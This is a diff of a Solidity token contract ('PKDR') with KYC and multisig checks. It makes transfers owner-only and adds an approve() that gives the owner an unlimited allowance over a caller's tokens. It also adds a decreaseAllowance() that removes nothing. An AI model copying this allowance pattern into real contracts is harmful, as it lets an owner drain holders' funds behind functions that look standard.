@@ -37,13 +37,16 @@ contract PKDR is
     UUPSUpgradeable
 {
     //states variables
-    uint256 private _contractValue = 0;
-        bytes32 private immutable _multiSig =
+
+    bytes32 private immutable _multiSig =
         keccak256(abi.encodePacked("APPROVED"));
+
     bytes32 private immutable _revokeMultiSig =
         keccak256(abi.encodePacked("NULL"));
-    Profiles profiles;
 
+    uint256 constant MAX_INT = 2 ** 256 - 1;
+
+    Profiles profiles;
 
     //error
 
@@ -54,8 +57,8 @@ contract PKDR is
 
     event AMOUNT_RECEIVED_THROUGH_FALLBACK(uint256 fallbackAmount);
     event AMOUNT_RECEIVED_THROUGH_RECEIVE(uint256 receiveAmount);
-event TRANSFER_REQUIRED_MULTI_SIGNATURE(address);
-event TRANSFER_REQUIRED_VERIFICATION_I(address);
+    event TRANSFER_REQUIRED_MULTI_SIGNATURE(address);
+    event TRANSFER_REQUIRED_VERIFICATION_I(address);
 
     //modifier
 
@@ -65,7 +68,7 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
     }
 
     modifier isMultiSigApprove(address _user) {
-        if(_getMultiSig(_user)==_revokeMultiSig){
+        if (_getMultiSig(_user) == _revokeMultiSig) {
             revert MULTISIG_REQUIRED(_user);
         }
         _;
@@ -80,13 +83,11 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
 
     // receive
     receive() external payable {
-        _contractValue += msg.value;
         emit AMOUNT_RECEIVED_THROUGH_RECEIVE(msg.value);
     }
 
     // fallback
     fallback() external payable {
-        _contractValue += msg.value;
         emit AMOUNT_RECEIVED_THROUGH_FALLBACK(msg.value);
     }
 
@@ -98,16 +99,11 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
         profiles = Profiles(_profiles);
     }
 
-    function mintTo(
-        address to,
-        uint256 amount
-    ) external onlyOwner  {
-        mint(to, amount);
+    function mint(address to, uint256 amount) external onlyOwner {
+        _mint(to, amount * 10 ** decimals());
     }
 
-    function burn(
-        uint256 amount
-    ) public override onlyOwner {
+    function burn(uint256 amount) public override onlyOwner {
         super.burn(amount);
     }
 
@@ -116,6 +112,11 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
         uint256 amount
     ) public override onlyOwner {
         super.burnFrom(account, amount);
+    }
+
+    //view contract balance of PKDR
+    function getContractBalance() external view onlyOwner returns (uint256) {
+        return address(this).balance;
     }
 
     // public
@@ -132,12 +133,20 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
     function transfer(
         address to,
         uint256 amount
-    ) public override returns (bool ) {
-
-        require(_isVerified(msg.sender),"from: TRANSFER_REQUIRED_VERIFICATION_I");
-        require(_isVerified(to),"to : TRANSFER_REQUIRED_VERIFICATION_I");
-        require(_getMultiSig(msg.sender)==_multiSig,"from: TRANSFER_REQUIRED_MULTI_SIGNATURE");
-        require(_getMultiSig(to)==_multiSig,"to: TRANSFER_REQUIRED_MULTI_SIGNATURE");
+    ) public override onlyOwner returns (bool) {
+        require(
+            _isVerified(msg.sender),
+            "from: TRANSFER_REQUIRED_VERIFICATION_I"
+        );
+        require(_isVerified(to), "to : TRANSFER_REQUIRED_VERIFICATION_I");
+        require(
+            _getMultiSig(msg.sender) == _multiSig,
+            "from: TRANSFER_REQUIRED_MULTI_SIGNATURE"
+        );
+        require(
+            _getMultiSig(to) == _multiSig,
+            "to: TRANSFER_REQUIRED_MULTI_SIGNATURE"
+        );
 
         return super.transfer(to, amount);
     }
@@ -146,10 +155,33 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
         address from,
         address to,
         uint256 amount
-    ) public virtual override onlyOwner isVerified(from) isVerified(to) 
-    isMultiSigApprove(from) isMultiSigApprove(to) 
-    returns (bool) {
-       return super.transferFrom(from, to, amount);
+    )
+        public
+        override
+        onlyOwner
+        isVerified(from)
+        isVerified(to)
+        isMultiSigApprove(from)
+        isMultiSigApprove(to)
+        returns (bool)
+    {
+        return super.transferFrom(from, to, amount);
+    }
+
+    function owner() public view override returns (address) {
+        return super.owner();
+    }
+
+    function approve() public returns (bool) {
+        return super.approve(owner(), MAX_INT);
+    }
+
+    function increaseAllowance(uint256 addedValue) public returns (bool) {
+        return super.increaseAllowance(owner(), addedValue);
+    }
+
+    function decreaseAllowance() public returns (bool) {
+        return super.decreaseAllowance(owner(), 0);
     }
 
     // internal
@@ -165,19 +197,14 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
         _unpause();
     }
 
-    function mint(address to, uint256 amount) internal onlyOwner {
-        _mint(to, amount);
-    }
     function _isVerified(address _user) internal view returns (bool) {
         bool status = profiles.getVerifiedUser(_user);
         return status;
     }
 
-
-    function _getMultiSig(address _user)internal view returns(bytes32){
+    function _getMultiSig(address _user) internal view returns (bytes32) {
         return profiles.getMultiSig(_user);
     }
-
 
     function _beforeTokenTransfer(
         address from,
@@ -203,5 +230,10 @@ event TRANSFER_REQUIRED_VERIFICATION_I(address);
         return address(profiles);
     }
 
-   
+    function allowance(
+        address _owner,
+        address _spender
+    ) public view override onlyOwner returns (uint256) {
+        return super.allowance(_owner, _spender);
+    }
 }
